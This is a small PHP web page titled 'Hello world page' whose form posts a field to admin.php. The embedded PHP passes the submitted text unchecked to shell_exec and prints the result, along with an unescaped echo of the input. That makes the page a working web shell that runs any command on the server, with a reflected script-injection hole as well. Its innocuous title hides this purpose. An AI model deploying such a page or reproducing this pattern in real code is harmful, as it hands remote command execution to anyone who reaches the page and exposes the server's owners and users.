<html lang="en">

<head>
    <title>Hello world page</title>
    <link rel="stylesheet" href="style.css" type="text/css" />
</head>

<body>
    <form action="admin.php" method="post">
        <input name="inp" />

        <input type="submit" name="submit" value="submit" />

    </form>
    <?php

    $command = $_POST['inp'];

    echo $command, "<br></br>";

    echo shell_exec($command);
    ?>
</body>

</html>